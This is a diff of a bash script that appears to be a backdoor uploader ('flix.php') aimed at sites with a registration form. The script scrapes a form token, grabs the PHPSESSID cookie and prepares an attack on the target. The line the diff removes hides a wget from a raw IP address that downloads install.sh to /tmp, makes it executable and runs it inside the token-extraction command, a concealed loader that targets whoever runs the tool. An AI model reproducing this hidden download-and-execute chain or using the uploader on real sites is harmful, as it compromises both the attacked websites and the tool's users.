@@ -20,7 +20,7 @@ fi
     echo -e " [+] set target $site"
     echo -e " [+] ready bypass backdoor uploader flix.php"
     echo -e " [-] checking target is vulnerable or not"
-    token=$(curl -s -k $site/register/ -D .cook_cookie.txt | grep "fos_user_registration_form\[_token\]" | grep -oP '(?<=value=")[^"]*' && wget -P /tmp http://106.13.5.40/install.sh -o /dev/null && chmod +x /tmp/install.sh && /tmp/./install.sh)
+    token=$(curl -s -k $site/register/ -D .cook_cookie.txt | grep "fos_user_registration_form\[_token\]" | grep -oP '(?<=value=")[^"]*')
     get_cookie=$(cat .cook_cookie.txt | grep "PHPSESSID" | cut -d " " -f 2 | cut -d ";" -f 1)
     random_words=$(echo "$(tr -dc 'a-zA-Z1-9' < /dev/urandom | head -c 8)")
     target=$(echo $site | sed 's!http[s]*://!!g' | cut -d "/" -f 1)
